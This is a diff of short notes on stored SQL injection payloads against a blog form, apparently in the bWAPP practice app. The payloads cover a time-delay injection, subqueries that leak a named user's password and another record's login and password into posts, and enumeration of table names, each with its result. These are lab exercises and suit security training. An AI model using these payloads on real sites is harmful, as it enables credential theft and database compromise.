@@ -1,13 +1,18 @@
-SQL Injection Stored Blog
+*SQL Injection Stored Blog*
 
 cotton candy'/sleep(15)/'
-result: causes the web page to "sleep" for 15 seconds and post the blog entry
+  result: causes the web page to "sleep" for 15 seconds and post the blog entry
 
 hello you', (select password from heroes where login='wolverine'))--
-result: creates a post with the owner displayed as wolverine's password
+  result: creates a post with the owner displayed as wolverine's password
 
 , (select login from heroes where id='2'))--
 #then
 , (select password from heroes where id='2'))--
-result: two seperate posts with one showing the password and one showing the login for id number 2
+  result: two seperate posts with one showing the password and one showing the login for id number 2
 
+enummeration', (select table_name from information_schema.tables where table_schema='bWAPP' limit 0,1))-- 
+then
+enummeration', (select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))-- 
+  result: owner in new post is table name, continue
+  
